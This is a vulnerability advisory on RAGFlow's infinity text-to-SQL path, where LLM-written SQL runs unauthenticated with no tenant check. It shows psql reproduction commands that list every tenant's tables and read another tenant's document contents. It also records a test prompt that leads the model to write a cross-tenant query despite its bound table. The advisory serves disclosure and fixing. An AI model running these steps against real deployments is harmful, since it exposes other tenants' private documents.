# RAGFlow: cross-tenant knowledge base read through the infinity text-to-SQL path

## Summary

RAGFlow's text-to-SQL retrieval turns a user's question into SQL using an LLM and then executes
that SQL on the configured document engine. When the engine is infinity, the statement is handed
to `psql -c` with no table-name validation, no check that the referenced tables belong to the
calling tenant, and no read-only enforcement.

All tenants' knowledge base tables live in the same `default_db` on the infinity instance, and
infinity's PostgreSQL wire protocol implementation performs no authentication and keeps no
permission model. As a result a single SELECT can read another tenant's knowledge base, including
the `content` column that holds document bodies.

The attacker needs a normal account on the RAGFlow instance and a chat session of their own. The
victim does nothing.

This was verified against a live infinity instance: connections succeed with a fabricated username
and no password, cross-table reads return data, and `SHOW TABLES` lists every tenant's tables.

## Affected versions

RAGFlow, vendor InfiniFlow, repository https://github.com/infiniflow/ragflow.

Verified against `main` at 2026-10-08, corresponding to the build `infiniflow/ragflow:v1.0.0-rc1`.

The affected path is specific to the infinity document engine, i.e. deployments with
`DOC_ENGINE=infinity`. The dependency `infiniflow/infinity` is affected in any version that still
contains the unauthenticated PG handler.

An exact vulnerable version range has not been established; no fix is available at the time of
writing.

## Vulnerability type

CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-284 (Improper Access Control),
CWE-89 (SQL Injection).

CVSS v3.1: `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`, 8.5 High.

`AV:N` because the attack runs through the web chat interface. `PR:L` because a regular account is
required. `UI:N` because the attacker acts alone. `S:C` because the attacker crosses a tenant
boundary. `C:H` because another tenant's data is disclosed. `I:N` and `A:N` because the read path
does not modify or deny anything.

`AC:L` reflects that the cross-tenant query succeeded on the first attempt, and that the model
produced it after explicitly noting the inconsistency between the table bound in its system prompt
and the table named in the user's question. A reviewer who considers LLM output not
attacker-controllable may prefer `AC:H`, which yields 6.8 Medium.

## Vulnerable code

The execution path is in `internal/engine/infinity/sql.go`. `RunSQL` performs two cosmetic
transformations and then executes the statement:

```go
// internal/engine/infinity/sql.go:289
func (e *Engine) RunSQL(ctx context.Context, tableName string, sqlText string, kbIDs []string, _ string) ([]map[string]interface{}, error) {
    if e == nil || e.client == nil {
        return nil, fmt.Errorf("infinity RunSQL: client not initialized")
    }
    sqlText = strings.TrimSpace(sqlText)
    if sqlText == "" {
        return nil, fmt.Errorf("infinity RunSQL: empty SQL")
    }

    sqlText = preprocessSQL(sqlText)
    aliasMap, _, err := loadFieldMapping(e.client.mappingFileName)
    if err != nil {
        return nil, fmt.Errorf("infinity RunSQL: %w", err)
    }
    sqlText = rewriteFieldAliases(sqlText, aliasMap)

    host, port := resolvePsqlHostPort(e.client.hostURI, e.client.postgresPort)
    res, err := runPsql(ctx, host, port, sqlText)
    if err != nil {
        return nil, err
    }
    return toRowMaps(res), nil
}
```

`preprocessSQL` collapses whitespace and backticks and removes `%`. `rewriteFieldAliases` rewrites
field aliases. Neither inspects which tables the statement touches.

```go
// internal/engine/infinity/sql.go:164
func runPsql(ctx context.Context, host, port, sql string) (*psqlResult, error) {
    psqlPath, err := findPsqlBinary()
    if err != nil {
        return nil, err
    }

    ctx, cancel := context.WithTimeout(ctx, psqlTimeout)
    defer cancel()

    cmd := exec.CommandContext(ctx, psqlPath, "-h", host, "-p", port, "-c", sql)
    ...
}
```

No `-U`, no credentials, no table allowlist, no tenant scope, no prefix check, no read-only
transaction, no LIMIT.

The same project handles this correctly on another engine. `internal/engine/vastbase/sql.go:36`
applies five layers:

```go
if tableName != "" {
    if err := validateIdentifier(tableName); err != nil { return nil, err }
}
normalized := strings.TrimSpace(strings.TrimSuffix(strings.TrimSpace(sqlText), ";"))
if strings.Contains(normalized, ";") {
    return nil, fmt.Errorf("multiple statements are not allowed")
}
lower := strings.ToLower(normalized)
if !strings.HasPrefix(lower, "select ") && !strings.HasPrefix(lower, "with ") {
    return nil, fmt.Errorf("only SELECT and WITH statements are allowed")
}
if !sqlLimitPattern.MatchString(normalized) {
    normalized += " LIMIT 1024"
}
tx, err := e.db.BeginTx(ctx, &sql.TxOptions{ReadOnly: true})
defer tx.Rollback()
```

A comment above that function records the reasoning behind the transaction:

> The SELECT/WITH prefix check is a guardrail, not the read-only control: a data-modifying CTE
> (`WITH d AS (DELETE FROM ... RETURNING *) SELECT * FROM d`) also starts with WITH, so the
> statement runs inside a READ ONLY transaction the engine always rolls back.

Across the engines shipped in this repository, vastbase is the only one with all four checks.
Infinity has none of them. Oceanbase has the prefix check and the LIMIT. Serenedb has the LIMIT.
Elasticsearch has none, though its SQL API does not accept multiple statements in the first place.

Upstream normalization does not reject embedded separators either:

```go
// internal/service/chat_pipeline.go:4318
func normalizeSQL(s string) string {
    thinkRe := regexp.MustCompile(`(?s)<think>.*?</think>`)
    s = thinkRe.ReplaceAllString(s, "")
    chineseThinkRe := regexp.MustCompile(`(?s)思考\n.*?\n`)
    s = chineseThinkRe.ReplaceAllString(s, "")
    fenceRe := regexp.MustCompile("(?i)```(?:sql)?\\s*")
    s = fenceRe.ReplaceAllString(s, "")
    fenceEnd := regexp.MustCompile("```\\s*$")
    s = fenceEnd.ReplaceAllString(s, "")
    s = strings.TrimSpace(s)
    s = strings.TrimRight(s, ";")
    return strings.TrimSpace(s)
}
```

Only the trailing semicolon is removed.

Table names carry the tenant:

```go
// internal/service/chat_pipeline.go:3957
func ragflowTableName(tenantID string, kbs []*entity.Knowledgebase, docEngine engine.DocEngine) string {
    if docEngine == nil {
        return "ragflow_" + tenantID
    }
    engineName := docEngine.GetType()
    if engineName == "infinity" && len(kbs) == 1 {
        if !isValidUUID(kbs[0].ID) {
            common.Warn("ragflowTableName: invalid kb_id; falling back to base index", ...)
            return "ragflow_" + tenantID
        }
        return fmt.Sprintf("ragflow_%s_%s", tenantID, kbs[0].ID)
    }
    return "ragflow_" + tenantID
}
```

## Root cause

The tenant boundary is expressed in the prompt and nowhere else.

```
user question -> buildSQLPrompts() -> generateSQL() [LLM] -> normalizeSQL() -> RunSQL() -> psql -c
```

`buildSQLPrompts` puts the caller's own table name into the prompt as `Table: ragflow_<tenant>_<kb>`,
and the same prompt ends with `Question: <the user's raw text>`. Nothing between prompt construction
and execution compares the tables the LLM names against the tables the caller is entitled to read.
The only thing preventing a cross-tenant query is the model choosing not to write one.

That is the same category of mistake as trusting a client to validate its own input: the control is
placed on the untrusted side of the boundary. An LLM reading user-controlled text is not a place to
enforce an authorization rule.

Underneath this, infinity's PG handler provides no second line of defense. In
`src/network/pg_protocol_handler_impl.cpp:49`:

```cpp
void PGProtocolHandler::send_authentication() {
    buffer_writer_.send_value_u8(static_cast<u8>(PGMessageType::kAuthentication));
    ...
    // TODO: Add real authentication workflow.
}
```

Searching `src/network/` for `permission`, `privilege`, `grant` or `role` returns nothing outside
license headers. There is no user, no role and no table-level restriction to bypass, because none
exist. Combined with the missing table allowlist in RAGFlow, nothing in the stack prevents one
tenant from reading another's tables.

## Reproduction

Environment: `infiniflow/ragflow:v1.0.0-rc1`, an infinity instance, `DOC_ENGINE=infinity`.

Steps 1, 2 and 4 below were run against a live infinity instance. Step 3 used RAGFlow's own prompts,
extracted verbatim from source, against a live LLM API.

Step 5, the full flow driven by the RAGFlow process itself, was not completed. The image
`infiniflow/infinity:v0.7.3-x64-v3` could not be retrieved in our environment, and the locally
available `nightly` build is not protocol-compatible with `ragflow:v1.0.0-rc1`. Each component
boundary was verified separately; the in-process integration was not. A script for the full flow is
in `e2e_poc.py`.

### 1. A connection with no valid credentials

RAGFlow calls `psql -h <host> -p <port> -c <sql>` with no `-U` and no password. Doing the same:

```
$ psql -h 172.18.0.2 -p 5432 -U nonexistent_user_xyz -c "SELECT 1"
 ?column?
----------
        1
(1 row)
```

The same works with no password supplied, and with any arbitrary password. A username that does not
exist is accepted.

### 2. Enumerating all tenants' tables

```
$ psql -h 172.18.0.2 -p 5432 -c "SHOW TABLES"
  database  |        table        | table_id | column_count | segment_count | block_count | create_timestamp | comment
------------+---------------------+----------+--------------+---------------+-------------+------------------+---------
 default_db | ragflow_tenanta_kb1 | 0        |            3 |             1 |           1 |                8 |
 default_db | ragflow_tenantb_kb2 | 1        |            3 |             1 |           1 |               10 |
(2 rows)
```

No UUIDs needed. `information_schema.tables` and `pg_tables` are not supported by infinity, but
`SHOW TABLES` covers the same ground.

### 3. The LLM writes the cross-tenant query

The prompt used was `infinitySQLSysPrompt` and `infinitySQLUserPromptTemplate` taken verbatim from
`internal/service/chat_pipeline.go`, with the table bound to the attacker's own
`ragflow_tenantA_kb1`, temperature 0.

Baseline, asking "how many records are in this dataset":

```sql
SELECT COUNT(*) AS record_count FROM ragflow_tenantA_kb1
```

Asking instead for `ragflow_tenantB_kb2`:

```sql
SELECT doc_id, docnm, json_extract_string(chunk_data, '$.authors') AS authors
FROM ragflow_tenantB_kb2
WHERE json_extract_isnull(chunk_data, '$.authors') == false
```

The second query targets another tenant's table and is returned without objection.

### 4. The read returns data, including content

```
$ psql -h 172.18.0.2 -p 5432 -c "SELECT docnm, content FROM ragflow_tenantA_kb1"
    docnm    |       content
-------------+---------------------
 A的机密文档 | 这是租户A的私有正文
(1 row)

$ psql -h 172.18.0.2 -p 5432 -c "SELECT * FROM ragflow_tenantA_kb1"
 doc_id |    docnm    |       content
--------+-------------+---------------------
 d1     | A的机密文档 | 这是租户A的私有正文
(1 row)
```

The system prompt includes a rule `DO NOT select 'content' field`. That is an instruction to the
model, not a control on the query. At the engine level nothing stops it.

### 5. The model noticed the inconsistency and complied

The `reasoning_content` field returned alongside the SQL in step 3, verbatim:

> The user asks to query ragflow_tenantB_kb2 table, returning content field.
> But rules say don't select content.
> Also the table given is ragflow_tenantA_kb1 but question mentions ragflow_tenantB_kb2. Hm

The model identified the mismatch between the bound table and the requested table and issued the
query anyway. This rules out the explanation that the model failed to notice; the boundary was
crossed while the model was aware of it, because nothing in the system had established that the
boundary was not negotiable.

## Impact

A normal authenticated user of a RAGFlow instance running `DOC_ENGINE=infinity` can read other
tenants' knowledge bases: table names, `doc_id`, `docnm`, `authors`, `page_num_int`, and the
`content` field holding document bodies. `SHOW TABLES` gives a complete list of every tenant's
knowledge base tables on the instance. No elevated privileges are involved, and the victim takes no
action.

Some boundaries on the impact. The behavior is specific to the infinity engine; other engines
differ, as set out above. The instance needs more than one user or tenant, so a strictly
single-user deployment has no victim. The `content` restriction exists only in the system prompt and
is bypassable by choosing a different model, by a stronger injection, or simply by `SELECT *`, as
step 4 shows at the engine level.

The issue is in the application layer, not in an exposed database port. Infinity's 5432 binds to
localhost by default (`conf/service_conf.yaml`: `infinity.uri: 'localhost:23817'`) and is not
mapped externally in the shipped compose configuration.

## Suggested fix

Enforce the boundary where the query is executed.

In `RunSQL`, before touching the database: reject statements containing `;`, restrict the statement
to a SELECT or WITH prefix while keeping in mind that the prefix check alone is a guardrail and not
a control, verify that every table referenced by the statement falls inside the caller's tenant
scope, and reject system catalog and `SHOW` statements. Then run the statement in a read-only
transaction so the database or engine layer rejects writes.

Beyond that specific function:

Complete the authentication TODO in infinity's PG handler
(`src/network/pg_protocol_handler_impl.cpp:49`) and build tenant-level table access isolation on top
of it.

Move the validation into a shared pre-execution layer used by all engines. The current divergence
between engine implementations is itself the reason cases get missed.

Do not treat system-prompt rules as a security boundary.

## References

- CWE-639: https://cwe.mitre.org/data/definitions/639.html
- CWE-284: https://cwe.mitre.org/data/definitions/284.html
- RAGFlow: https://github.com/infiniflow/ragflow
- InfiniFlow infinity: https://github.com/infiniflow/infinity
- OWASP Top 10 for LLM Applications, LLM01 Prompt Injection

## Disclosure

Published for public reference. Vendor notification prior to wider publication is recommended.

---


